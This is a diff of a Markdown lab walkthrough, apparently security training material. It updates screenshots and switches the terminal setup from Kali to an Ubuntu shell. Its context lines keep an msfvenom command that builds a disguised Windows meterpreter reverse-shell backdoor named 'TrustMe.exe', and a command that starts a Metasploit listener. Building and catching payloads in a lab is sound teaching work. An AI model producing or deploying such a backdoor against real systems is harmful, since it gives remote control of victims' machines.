@@ -268,25 +268,24 @@ Run the following commands to start a simple backdoor and backdoor listener:
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
-<img width="646" height="148" alt="image" src="https://github.com/user-attachments/assets/d84a0070-9c3f-47cb-b1b4-ea447ddbdeef" />
+
+
+<img width="1096" height="136" alt="2026-03-26_10-33" src="https://github.com/user-attachments/assets/cedde4be-e44e-4bab-87bb-5a683603e50f" />
 
 
 
-Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
 
-<img width="71" height="68" alt="image" src="https://github.com/user-attachments/assets/5f116093-6854-4e55-a231-0c42359dc163" />
+Let's start the **Metasploit** Handler. We need another **Linux Terminal**
 
+- **Double-click** `Ubuntu Shell` on Desktop
 
-Let's become root.
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
-```bash
-sudo su -
-```
 
 Now let's start the **Metasploit** Handler
 
 ```bash
-msfconsole -q
+sudo msfconsole -q
 ```
 
 We are going to run the following commands to correctly set the parameters:
@@ -311,7 +310,9 @@ exploit
 
 It should look like this:
 
-<img width="636" height="405" alt="image" src="https://github.com/user-attachments/assets/ca5787cd-967d-45b0-ac90-327b4eabfe69" />
+<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
+
+
 
 
 We will need to open a **"cmd.exe"** terminal as **Administrator**.
